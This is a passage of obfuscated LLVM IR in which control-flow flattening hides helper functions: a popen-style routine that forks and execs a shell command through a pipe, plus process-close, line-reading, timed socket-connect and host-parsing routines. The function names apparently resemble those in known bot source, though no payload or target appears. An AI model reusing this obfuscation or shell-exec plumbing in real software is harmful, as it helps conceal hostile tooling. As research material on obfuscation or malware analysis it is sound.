    i32 403707833, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 1456217124, i32 1728000630
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 -1015343068, i32 1728000630
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 -1015343068, i32 -1442432514
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 -609453504, i32 -265793625
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -800938631, i32 899757205
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 58769967, i32 -1039784144
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 -296718462, i32 -639064540
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 899757205, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 249759176, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -2119633674, i32 -967170824
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 2027023031, i32 -600716368
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -1494296155, i32 -600716368
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 961597428, i32 -2034520762
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 1891517081, i32 1658441723
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 1658441723, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1797362751, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 1527026372, i32 1007743906
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 1007743906, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1797362751, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 849162065, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 -1004870007, i32 115081032
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 -1177879879, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 -1177879879, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 403707833, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 780578934, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 780578934, label %first
    i32 -1684787113, label %13
    i32 1091537654, label %21
    i32 -477305117, label %22
    i32 1705923678, label %30
    i32 -432112819, label %37
    i32 100934640, label %41
    i32 1754406831, label %45
    i32 -1974125452, label %47
    i32 2100657071, label %56
    i32 -419681846, label %57
    i32 54637336, label %64
    i32 -1487065445, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 1091537654, i32 -1684787113
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 1091537654, i32 -477305117
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1487065445, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 1705923678, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -432112819, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 100934640, i32 1754406831
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 1754406831, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 1705923678, i32 -1974125452
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 2100657071, i32 -419681846
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 54637336, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 54637336, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -1487065445, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 129467130, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 129467130, label %9
    i32 -1096177702, label %13
    i32 1556762848, label %18
    i32 782960730, label %27
    i32 -634848057, label %29
    i32 -1902968862, label %39
    i32 -1513958639, label %43
    i32 1269972371, label %44
    i32 -632529928, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -1096177702, i32 782960730
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 1556762848, i32 782960730
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 782960730, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -634848057, i32 -1902968862
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 129467130, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -1513958639, i32 1269972371
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -632529928, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 -632529928, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1480426401, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1480426401, label %first
    i32 -968663528, label %37
    i32 1792730819, label %38
    i32 239969150, label %47
    i32 1175912190, label %52
    i32 -1169606875, label %57
    i32 -505927610, label %66
    i32 942925226, label %83
    i32 -391663714, label %90
    i32 95390661, label %91
    i32 1670913663, label %92
    i32 1621493628, label %93
    i32 -422159151, label %94
    i32 1101432404, label %95
    i32 1703904707, label %96
    i32 1808880831, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -968663528, i32 1792730819
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1808880831, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 239969150, i32 1703904707
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 1175912190, i32 -422159151
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1169606875, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !1
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -505927610, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 942925226, i32 1670913663
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -391663714, i32 95390661
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1808880831, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 1621493628, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1808880831, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1101432404, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1808880831, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1703904707, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 1808880831, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 599526028, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 599526028, label %first
    i32 2077423792, label %13
    i32 -463252025, label %14
    i32 906538895, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 2077423792, i32 -463252025
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 906538895, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 906538895, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -92831414, i32* %switchVar
